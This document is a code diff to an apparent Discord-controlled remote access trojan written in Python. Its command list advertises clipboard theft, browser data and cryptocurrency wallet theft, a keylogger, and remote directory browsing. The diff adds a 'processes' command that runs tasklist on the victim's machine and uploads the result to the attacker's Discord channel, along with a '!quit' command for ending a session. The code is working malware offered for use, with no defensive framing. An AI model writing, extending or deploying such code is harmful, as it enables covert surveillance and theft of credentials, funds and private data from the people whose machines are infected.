@@ -42,6 +42,7 @@ commands = "\n".join([
     "ping - Ping command",
     "sys - System information",
     "clipboard - Return clipboard content",
+    "processes - Get all running processes",
     "cd - Change directory",
     "ls - List directory",
     "cwd - Get current working directory",
@@ -58,6 +59,7 @@ commands = "\n".join([
     "browser - Get browser data",
     "wallet - Get wallet information",
     "keylogger - Enable keylogger",
+    "!quit - Exit session without deleting all the data",
     "!exit - Exit session and delete all data"
 ])
 
@@ -195,6 +197,24 @@ async def on_message(message):
             
             embed = discord.Embed(title="Clipboard Content", description=f"```{clipboard}```", color=0xfafafa)
             await message.reply(embed=embed)
+            
+    elif message.content == "processes":
+        try: 
+            tasks = os.popen("tasklist").read()
+        except:
+            await message.reply("Failed to fetch task list!") 
+            return
+
+
+        if len(tasks) > 1500:
+            with open("tasklist.txt", "w", encoding="utf-8") as f:
+                f.write(tasks)
+            await message.reply(file=discord.File("tasklist.txt"))
+            delete_files(["tasklist.txt"])
+        else:
+            embed = discord.Embed(title="Processes", description=f"```{tasks}```", color=0xfafafa)
+            await message.reply(embed=embed)
+    
     
     elif message.content.startswith("cd"):
         directory = message.content[3:] #.split(" ")[1]
@@ -350,9 +370,6 @@ async def on_message(message):
     elif message.content == "wallet":
         await wallets(message.channel)
     
-    elif message.content == "!exit":
-        await message.channel.delete()
-        await client.close()
 
     #elif message.content == "keylogger":
     #    await message.reply("Creating new webhook for keylogger...")
@@ -365,6 +382,12 @@ async def on_message(message):
     #    
     #    await message.reply("Keylogger enabled!")
        
+    elif message.content == "!quit":
+        await client.close()
+       
+    elif message.content == "!exit":
+        await message.channel.delete()
+        await client.close()
        
     else:
         embed = discord.Embed(title="Error", description="```Unknown command, use 'help' for full list of commands!```", color=0xfafafa)
